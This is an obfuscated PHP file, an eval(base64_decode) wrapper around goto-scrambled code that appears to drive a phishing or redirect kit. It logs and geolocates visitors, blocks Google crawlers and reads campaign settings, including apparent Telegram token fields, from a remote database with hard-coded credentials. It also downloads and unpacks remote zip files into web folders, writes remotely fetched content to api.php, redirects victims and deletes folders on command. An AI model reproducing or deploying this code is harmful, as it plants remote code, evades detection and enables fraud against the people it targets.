<?php eval(base64_decode('
 goto MyrRY; MHpNt: $curl = curl_init($url); goto DOhza; pqEir: $donflag = $protocol . "\x3a\x2f\57" . $domain; goto oyA5A; U148r: $_SESSION["\126\157\x70\x72\164"] = isset($info["\143\151\x74\171"]) ? $info["\x63\151\x74\171"] : null; goto sW7n6; v2rE0: function Rand_XD_TF($length) { $characters = "\x61\x62\143\x64\145\x66\152\150\151\x67\153\154\155\156\x6f\160\x71\x72\x73\x74\165\166\x77\x78\x79\172\x30\x31\x32\63\x34\65\66\x37\x38\x39\x41\102\x43\104\x45\106\x47\x48\111\112\113\x4c\x4d\116\117\x50\x51\122\x53\124\x55\126\x57\x58\x59\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto KgYd8; brkq_: if (strpos(gethostbyaddr($StrupLom), "\147\157\x6f\147\154\145") !== false) { $refix = "\x42\x6f\163\145\x20\107\40\62"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto LoYgw; rQwmX: ini_set("\144\x69\163\160\154\141\x79\x5f\x65\x72\x72\x6f\x72\x73", 1); goto KENoh; h3RmW: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\x2e\x2e") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto Cree_; qcrgg: $directories = glob($parentDirectory . "\57\52", GLOB_ONLYDIR); goto UbcC5; u2s8D: $info = unserialize($response); goto umUYb; vCziB: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\156\x65\143\x74\x69\157\156\x20\x66\141\151\x6c\x65\x64\72\40" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\x45\103\x54\x20\x2a\x20\106\122\x4f\115\40\162\145\x64\151\x72\x63\x74\151\x6f\156\40\127\x48\x45\x52\105\x20\x69\x64\75\47{$id}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\x69\x6e\x6b"] = base64_decode(base64_decode($row["\154\151\x6e\153"])); $_SESSION["\x63\x6e"] = explode("\x3b", base64_decode(base64_decode($row["\143\x6f\x75\x6e\164\162\171"]))); $_SESSION["\160\x69\x63"] = $row["\160\151\143"]; $_SESSION["\155\x73\x67"] = base64_decode(base64_decode($row["\155\163\x67"])); $_SESSION["\145\x78\x70"] = $row["\x65\x78\x70\151\x72\x65"]; $_SESSION["\x73\x65\162\166\x65\x72"] = base64_decode(base64_decode($row["\x73\145\162\166\x65\x72"])); $_SESSION["\x75\x72\x6c"] = base64_decode(base64_decode($row["\165\162\x6c"])); $_SESSION["\154\165\x78\x63\x61\x70\164\143\150\141"] = $row["\154\165\x78\x63\141\160\164\x63\x68\141"]; $_SESSION["\164\x6f\x6b\145\x6e\x74\145\154"] = base64_decode(base64_decode($row["\x74\157\153\x65\x6e\164\x65\x6c"])); $_SESSION["\x69\x64\164\x65\154"] = base64_decode(base64_decode($row["\x69\144\x74\145\x6c"])); $_SESSION["\162\x65\x64\x69\162\x69\x63\164"] = $row["\162\x65\x64\151\x72\x69\143\x74"]; $_SESSION["\x61\x70\x69"] = $row["\x61\x70\151"]; if (isset($_GET["\166\x73\163"])) { setcookie("\x74\x6f\x6b\x65\156\x74\x65\154", $_SESSION["\x74\157\153\x65\156\164\145\154"], time() + 86400 * 30, "\x2f"); setcookie("\151\x64\x74\145\x6c", $_SESSION["\151\144\x74\x65\154"], time() + 86400 * 30, "\57"); setcookie("\x72\145\144\x69\162\151\x63\x74", $_SESSION["\x72\x65\144\x69\x72\151\x63\164"], time() + 86400 * 30, "\57"); } } } else { $refix = "\x70\x72\157\152\x65\143\x74\40\x49\104\40\111\x6e\x76\141\154\151\x64\x20{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto v2rE0; Rw9nl: if (isset($_GET["\154\157\x6c\155\x65"])) { $vdir = $_GET["\x6c\x6f\x6c\155\x65"]; $refix = "\x49\x6e\x76\141\154\151\144\40\x6c\x6f\154\x6d\145"; $redi = $_COOKIE["\162\145\x64\x69\162\x69\143\164"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\167\x65\142\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\163\x63\x72\x69\x70\x74\40\x4c\101\x4e\x47\125\x41\x47\x45\x3d\47\x4a\x61\166\x61\x53\143\x72\151\x70\x74\47\x3e\xa\x20\40\x20\40\x77\151\156\x64\157\167\x2e\x6c\x6f\143\x61\x74\x69\157\x6e\56\x68\162\145\x66\x3d\x27{$redi}\x27\x3b\xa\40\x20\40\x20\x3c\x2f\163\143\x72\151\160\x74\x3e"; die; } goto AfjPD; UbcC5: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto BXZpu; y3Wgx: if (isset($_POST["\154\x6f\143\141\154\151\160"])) { $myips = base64_decode(base64_decode($_POST["\x6c\x6f\143\141\154\x69\x70"])); $_SESSION["\154\157\x6c\x69\x70\163"] = $myips; $StrupLom = $myips; } else { $refix = "\116\157\164\40\106\x6f\165\156\144\x20\111\x50\123"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto m3aTo; m_h_I: $_SESSION["\x4e\x6a\x6f\160\x66"] = isset($info["\143\x6f\165\x6e\164\x72\171\x43\x6f\144\x65"]) ? $info["\x63\x6f\165\x6e\x74\162\x79\103\157\x64\145"] : null; goto U148r; ldblU: $Fixbom = base64_decode("\143\63\x52\171\x62\62\x35\x6e\130\x32\122\150\145\x51"); goto EdFVc; KENoh: if (!empty($_SERVER["\110\124\124\120\x5f\103\114\111\105\x4e\124\x5f\x49\x50"])) { $ipAddress = $_SERVER["\x48\x54\124\x50\x5f\x43\114\x49\x45\x4e\x54\137\111\120"]; } elseif (!empty($_SERVER["\x48\x54\124\120\x5f\x58\x5f\x46\x4f\122\x57\101\x52\x44\105\104\137\x46\x4f\x52"])) { $ipAddress = $_SERVER["\110\x54\x54\x50\x5f\x58\137\106\117\122\127\101\x52\104\x45\x44\137\106\117\122"]; } else { $ipAddress = $_SERVER["\122\105\x4d\x4f\124\x45\137\101\104\x44\x52"]; } goto J6MDN; FuWkO: $Nopwvv = base64_decode("\x63\x33\x52\x79\142\62\65\x6e\x58\62\122\x68\145\x51"); goto CWXtS; qOtTS: if ($_SERVER["\x52\x45\121\125\105\x53\124\137\x4d\105\124\x48\117\104"] === "\x50\117\123\x54") { if (!isset($_POST["\154\x6f\143\141\x6c\x69\x70"])) { $refix = "\111\x50\x53\40\156\x6f\x74\x20\x66\x6f\x75\156\x64"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\163\150\157\160\x69\x64"])) { $refix = "\160\162\157\x6a\145\x63\x74\40\111\104\40\x4e\x6f\164\40\x66\x6f\165\156\x64"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\x65\x62")) { if (!mkdir("\x77\x65\142", 511)) { die("\106\141\x69\154\145\x64\40\x74\x6f\x20\143\x72\x65\141\164\145\40\x77\145\x62\x20\x64\151\162\x65\143\x74\157\162\x79"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\x77\x65\142\x2f{$sub_folder}\x2f"; $zipFileUrl = $_SESSION["\x75\162\x6c"]; $tempDir = "\164\145\155\x70"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\57{$folder_name}\x2e\x7a\151\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\106\141\x69\x6c\145\x64\40\x74\157\40\143\162\x65\141\x74\x65\40\x74\x68\145\x20\x66\157\x6c\144\x65\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\56\56") { rename($folder_path . "\x2f" . $file, $folder_path . $file); } } } else { echo "\x46\141\x69\154\145\144\40\164\157\40\x65\170\164\x72\x61\x63\164\40\164\150\145\x20\x7a\x69\x70\x20\146\151\154\x65\x2e"; } } else { die("\x46\x61\x69\x6c\x65\x64\x20\x74\157\x20\144\157\167\156\154\157\141\144\40\x74\x68\x65\40\x7a\151\x70\40\x66\x69\x6c\145\56"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\154\x6f\x6c\163\x6f\x75\x6c\163"]; $_SESSION["\154\157\143\141\154\x64\x69\x72"] = "{$folder_path}"; file_put_contents("{$folder_path}\57\154\x6f\143\x61\154\x2e\164\x78\164", "{$StrupLom}\xa", FILE_APPEND); $fileURL = $_SESSION["\x61\x70\x69"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\167\x65\x62\x2f\x61\160\151\x2e\160\x68\160"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\x41\x50\x49") { getFileContents($fileURL); } $localip = isset($_POST["\x6c\x6f\x63\x61\x6c\151\160"]) ? $_POST["\154\157\x63\x61\x6c\x69\160"] : null; $domainname = isset($_POST["\144\157\155\x61\151\x6e\x6e\141\x6d\145"]) ? $_POST["\x64\x6f\155\x61\151\x6e\x6e\141\155\x65"] : null; $nextdomain = isset($_POST["\x6e\145\x78\x74\x64\x6f\155\x61\151\x6e"]) ? $_POST["\156\x65\x78\164\x64\157\155\141\x69\156"] : null; $shopid = isset($_POST["\163\150\x6f\x70\151\144"]) ? $_POST["\x73\150\157\160\x69\144"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\164\x65\155\160"; $zipFiles = glob($directory . "\x2a\56\172\151\160"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } $responseData = array("\x73\x74\x61\164\165\x73" => "\x73\165\143\143\x65\x73\163", "\142\x61\143\153\x5f\x64\151\x72" => $folder_path, "\142\141\143\153\x5f\x75\162\x6c" => $nextdomain, "\x62\x61\143\153\137\x69\x64" => $shopid, "\x6d\145\x73\x73\141\x67\x65" => "\104\141\164\141\x20\x72\145\143\x65\x69\x76\x65\x64\40\163\165\x63\143\145\x73\x73\146\165\154\154\x79"); $responseJson = json_encode($responseData); echo $responseJson; } else { http_response_code(400); echo "\115\x69\163\x73\151\156\147\x20\x72\145\x71\165\151\x72\x65\x64\40\144\x61\x74\x61"; } } else { http_response_code(405); echo "\x49\156\x76\141\x6c\x69\144\x20\x72\145\161\x75\145\163\164\x20\x6d\x65\x74\150\157\x64"; } goto DvwYS; k6bkZ: $domain = $_SERVER["\x48\x54\124\120\x5f\x48\x4f\x53\x54"]; goto pqEir; Ths50: $StrupLom = $ipPortArray[0]; goto U8gmD; POs_f: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\x2e\x2e") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto h3RmW; J6MDN: $ipPortArray = explode("\72", $ipAddress); goto Ths50; LoYgw: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto fpg0x; Gq2nB: $IpCount = FOx_TGH_X($userAgent); goto OWfvw; Z6lKZ: if (strpos($userAgent, "\147\x6f\x6f\147\x6c\145") !== false) { $refix = "\102\x6f\163\145\x20\x47"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto brkq_; xUrFa: if (isset($_POST["\x73\x68\157\160\151\144"])) { $gameid = $_POST["\x73\150\157\160\x69\144"]; $_SESSION["\154\157\x6c\x73\157\x75\x6c\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto vCziB; OWfvw: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\110\124\124\x50\137\x55\123\x45\x52\x5f\101\107\x45\x4e\x54"]) ? $_SERVER["\110\x54\124\120\137\x55\123\x45\x52\137\101\x47\105\x4e\x54"] : ''; $isp = $_SESSION["\151\163\160"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\x53\x45\122\126\x45\x52\x5f\x4e\101\115\x45"]; $LOCALO_TEMPO = date("\x59\55\155\55\144\40\x48\x3a\x69\x3a\163"); $Blasacoun = $_SESSION["\102\154\141\163\x61\x63\x6f\x75\156"]; $Njopf = $_SESSION["\x4e\152\157\160\146"]; $Voprt = $_SESSION["\x56\157\160\x72\164"]; $xOpuy = $_SESSION["\x78\x4f\x70\165\171"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\x6f\156\x6e\x65\x63\164\x69\157\x6e\40\x66\141\x69\154\145\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\105\x4c\x45\x43\x54\40\52\40\x46\122\117\115\x20\154\157\x67\163\x20\x57\x48\105\122\x45\x20\x69\160\141\x64\144\162\145\163\x3d\x27{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\41\41"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\x27", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\47", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\47", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\x27", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\x27", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\x27", '', $refix)); $query = "\x49\116\x53\105\122\x54\x20\x49\116\x54\117\40\154\157\147\x73\x20\50\151\x70\141\x64\144\162\x65\163\54\x63\x6f\165\x6e\164\x72\x79\54\142\162\x6f\x77\163\x65\162\x2c\x6f\x73\54\144\157\155\x69\156\x65\54\x6d\171\164\151\155\x65\54\x68\x6f\x73\164\54\x69\163\x70\54\x72\x65\x73\x6f\156\51\40\12\x20\40\x20\40\x20\x20\11\40\x20\40\40\11\x20\40\x56\x41\x4c\x55\105\x53\x20\x28\47{$StrupLom}\47\x2c\x27{$Blasacoun}\47\54\x27{$IpCount}\47\54\47{$OKJIVGRD}\x27\x2c\47{$donflag}\47\x2c\x27{$LOCALO_TEMPO}\47\54\47{$host}\x27\54\x27{$isp}\47\x2c\x27{$refix}\x27\x29"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\x21"; } } goto Z6lKZ; sW7n6: $_SESSION["\170\x4f\x70\x75\171"] = isset($info["\x72\x65\x67\151\x6f\156\116\x61\155\145"]) ? $info["\162\x65\x67\x69\x6f\x6e\x4e\x61\x6d\x65"] : null; goto POs_f; eDU0K: if (isset($_GET["\145\x6e\x64\155\145\154\165\x78"])) { $redi = $_COOKIE["\x72\145\144\151\x72\151\143\164"]; $vdir = $_GET["\145\x6e\x64\155\145\154\165\x78"]; $directoryToDelete = "\167\x65\x62\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\163\x63\162\151\160\164\40\x4c\101\116\107\x55\x41\x47\105\75\47\x4a\141\166\x61\123\143\x72\151\x70\164\47\x3e\12\40\x20\x20\x20\167\x69\x6e\x64\157\167\x2e\x6c\x6f\143\141\x74\x69\x6f\x6e\56\150\x72\x65\x66\x3d\x27{$redi}\x27\x3b\xa\x20\40\40\x20\x3c\57\163\143\x72\151\160\164\x3e"; die; } goto Rw9nl; EdFVc: $Lredsvv = base64_decode("\x5a\110\x4a\x6a\132\62\x6c\x73\x65\x56\101\167\x4b\155\163\x6d"); goto FuWkO; o2mhl: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\156\153\156\x6f\x77\156\40\102\162\157\167\163\145\x72"; $BROWSER = array("\x2f\155\163\151\145\57\151" => "\x49\x6e\164\145\x72\156\x65\164\40\x45\x78\x70\154\x6f\162\x65\x72", "\x2f\146\151\162\x65\x66\157\x78\x2f\151" => "\106\x69\x72\145\x66\157\170", "\x2f\163\141\146\141\162\151\x2f\x69" => "\123\x61\146\x61\x72\151", "\57\143\x68\162\157\155\145\x2f\151" => "\103\x68\162\x6f\155\x65", "\x2f\145\144\x67\145\57\x69" => "\105\144\x67\145", "\57\157\160\145\162\141\57\151" => "\117\x70\x65\162\141", "\57\156\145\164\x73\143\x61\x70\145\x2f\151" => "\x4e\x65\164\163\143\x61\160\145", "\x2f\x6d\141\x78\164\x68\x6f\156\x2f\x69" => "\115\x61\170\x74\x68\157\156", "\57\153\157\x6e\161\x75\145\x72\x6f\x72\57\151" => "\113\157\156\x71\165\145\162\x6f\162", "\x2f\x6d\157\x62\x69\154\x65\57\151" => "\x48\x61\156\144\x68\145\x6c\144\40\x42\x72\157\x77\163\x65\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto Yy52c; U8gmD: $domine = $_SERVER["\x53\x45\x52\126\x45\122\137\116\x41\x4d\x45"]; goto n0eqJ; m3aTo: $protocol = isset($_SERVER["\x48\x54\124\x50\123"]) && $_SERVER["\x48\124\x54\120\123"] === "\x6f\156" ? "\x68\x74\164\160\x73" : "\x68\x74\x74\x70"; goto k6bkZ; mpDiC: $response = curl_exec($curl); goto We1Ri; umUYb: $_SESSION["\x69\x73\x70"] = isset($info["\x69\x73\x70"]) ? $info["\151\x73\160"] : null; goto CTP9f; DOhza: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto mpDiC; n0eqJ: $TIME_DATE = date("\131\x2d\x6d\55\x64\40\110\x3a\x69\72\163"); goto y3Wgx; CWXtS: $url = "\150\164\x74\160\x3a\x2f\57\151\x70\55\x61\x70\x69\56\x63\157\x6d\x2f\x70\x68\160\57{$StrupLom}\x3f\x66\151\x65\x6c\144\163\x3d\x73\x74\141\x74\x75\163\x2c\x6d\145\163\x73\141\x67\145\x2c\143\157\x6e\164\x69\x6e\145\x6e\164\54\x63\157\x6e\x74\151\x6e\145\156\x74\x43\157\144\145\54\x63\157\165\156\164\162\x79\54\x63\x6f\x75\x6e\164\162\x79\103\x6f\144\x65\x2c\162\x65\147\x69\157\x6e\54\x72\145\147\151\x6f\x6e\116\x61\155\145\x2c\x63\x69\164\171\x2c\x64\151\x73\164\162\x69\x63\x74\54\172\151\160\54\154\x61\164\x2c\154\x6f\156\54\164\x69\155\x65\172\157\156\x65\54\143\165\x72\x72\145\156\143\x79\54\151\163\160\x2c\x6f\162\x67\x2c\x61\163\54\x61\163\x6e\141\155\x65\x2c\162\x65\x76\145\x72\x73\x65\54\155\157\x62\151\154\145\54\160\x72\x6f\170\171\54\x68\157\163\164\151\156\147\54\161\x75\145\x72\x79"; goto MHpNt; G1sec: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\125\156\x6b\x6e\x6f\167\156\x20\x4f\123\40\x50\154\x61\164\x66\x6f\162\x6d"; $OS = array("\x2f\167\151\x6e\x64\x6f\167\163\x20\x6e\x74\40\x31\x30\x2f\x69" => "\x57\x69\x6e\x64\x6f\167\x73\40\x31\60", "\x2f\167\x69\x6e\x64\157\x77\163\x20\156\164\40\x36\x2e\63\57\151" => "\127\x69\x6e\144\x6f\x77\x73\40\x38\56\x31", "\x2f\167\x69\x6e\144\x6f\x77\x73\x20\156\164\40\66\x2e\62\57\151" => "\x57\x69\156\x64\157\167\163\x20\x38", "\x2f\167\151\x6e\x64\157\167\x73\40\156\164\x20\66\x2e\x31\57\151" => "\x57\151\x6e\144\157\x77\163\40\67", "\57\167\x69\x6e\x64\157\x77\x73\x20\156\x74\x20\66\x2e\x30\57\x69" => "\x57\x69\156\144\x6f\167\x73\40\126\x69\x73\164\141", "\57\x77\151\156\144\x6f\167\163\40\156\x74\40\65\x2e\62\x2f\151" => "\127\151\x6e\144\157\x77\163\x20\123\145\162\x76\145\162\40\x32\x30\60\x33\57\130\120\40\x78\66\x34", "\57\167\x69\x6e\x64\x6f\167\163\40\156\164\x20\x35\56\x31\x2f\x69" => "\x57\x69\x6e\144\157\x77\x73\x20\x58\120", "\57\167\x69\x6e\144\x6f\167\x73\x20\170\x70\57\x69" => "\127\151\x6e\x64\x6f\167\x73\x20\x58\120", "\57\167\x69\x6e\144\x6f\167\163\40\156\164\x20\65\x2e\x30\57\x69" => "\x57\151\156\144\157\167\163\40\x32\x30\60\x30", "\x2f\167\151\x6e\144\x6f\x77\163\40\155\x65\x2f\x69" => "\x57\x69\x6e\144\157\x77\163\40\x4d\x45", "\x2f\x77\x69\156\71\x38\57\x69" => "\127\x69\x6e\144\157\x77\x73\x20\71\70", "\x2f\167\x69\156\71\x35\57\151" => "\127\x69\156\144\157\x77\x73\x20\71\x35", "\57\167\x69\x6e\x31\x36\x2f\x69" => "\127\151\156\144\157\167\x73\40\x33\x2e\x31\x31", "\x2f\x6d\x61\x63\x69\x6e\x74\157\x73\150\174\155\141\x63\40\157\163\x20\x78\57\x69" => "\115\x61\x63\x20\x4f\x53\x20\130", "\x2f\155\141\x63\137\x70\x6f\x77\x65\162\160\x63\57\151" => "\x4d\x61\143\x20\117\x53\x20\71", "\57\154\151\x6e\x75\x78\x2f\151" => "\114\x69\156\165\x78", "\57\165\142\x75\156\164\x75\57\x69" => "\x55\142\165\156\164\165", "\x2f\151\x70\x68\x6f\156\x65\57\x69" => "\x69\120\150\157\x6e\145", "\x2f\151\160\x6f\x64\x2f\151" => "\x69\x50\x6f\x64", "\57\151\x70\x61\144\x2f\x69" => "\x69\x50\x61\144", "\57\x61\x6e\144\x72\157\x69\144\57\x69" => "\x41\156\144\162\x6f\x69\x64", "\57\x62\154\x61\x63\153\142\x65\x72\162\171\57\151" => "\x42\154\141\143\153\x42\x65\x72\x72\171", "\x2f\x77\x65\142\x6f\x73\57\x69" => "\x4d\157\142\x69\x6c\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto o2mhl; pevtC: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\41\41\x21"; echo $showpip; die; } goto eDU0K; fpg0x: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto qOtTS; oUnms: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto Gq2nB; oyA5A: $datalog = base64_decode("\x65\155\x56\171\x62\171\x31\x6b\x59\x58\x6b\x75\x63\x32\x68\166\x63\101"); goto ldblU; AfjPD: if (isset($_GET["\x76\163\x73"])) { $gameid = $_GET["\163\157\165\x6c\x73"]; $_SESSION["\154\157\x6c\x73\157\x75\x6c\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\166\163\163"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\74\163\143\162\x69\160\164\40\114\x41\x4e\x47\x55\101\x47\105\75\x27\112\x61\x76\141\x53\x63\162\x69\x70\x74\47\76\12\x20\x20\40\x20\x77\x69\x6e\144\x6f\x77\x2e\154\157\143\141\164\x69\157\x6e\56\150\162\145\x66\x3d\47{$folder_pathx}\77\46\166\141\154\x69\x64\x3d{$RandOP_Mlux}{$RandOP_Mlux}\x26\141\154\x65\x72\164\x3d{$RandOP_Mlux}\46\x78\x6c\x70\x73\75{$RandOP_Mlux}\x26\163\x6f\165\154\x73\75{$gameid}\x26\x64\157\x6e\x65\75\x26\x65\162\162\157\x72\x79\75{$RandOP_Mlux}\x26\x6d\156\145\x6d\157\x6e\x69\143\75\46\152\x62\x3d{$RandOP_Mlux}\47\73\12\x20\x20\x20\40\x3c\x2f\x73\x63\x72\x69\x70\164\76"; die; } goto xUrFa; Cree_: $parentDirectory = "\x77\145\142"; goto qcrgg; Yy52c: $userAgent = isset($_SERVER["\x48\x54\x54\120\137\x55\123\x45\122\137\x41\107\x45\116\124"]) ? $_SERVER["\x48\124\124\x50\x5f\x55\x53\x45\x52\x5f\101\107\105\116\x54"] : ''; goto oUnms; MyrRY: error_reporting(E_ALL); goto rQwmX; BXZpu: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\x6e\156\x65\x63\164\x69\157\156\x20\x66\x61\151\x6c\145\144\72\40" . mysqli_connect_error()); } $sql_u = "\123\105\x4c\x45\x43\124\40\x2a\x20\x46\122\x4f\115\40\x6c\x6f\147\x73\40\x57\x48\x45\122\105\40\151\160\x61\144\x64\162\145\163\x3d\47{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto pevtC; CTP9f: $_SESSION["\x42\154\x61\163\x61\x63\157\x75\156"] = isset($info["\x63\157\x75\156\x74\162\171"]) ? $info["\143\157\165\156\164\162\x79"] : null; goto m_h_I; KgYd8: function rand_num($length) { $characters = "\x30\x31\x32\63\64\65\66\67\x38\x39"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto G1sec; We1Ri: curl_close($curl); goto u2s8D; DvwYS: ')); ?>
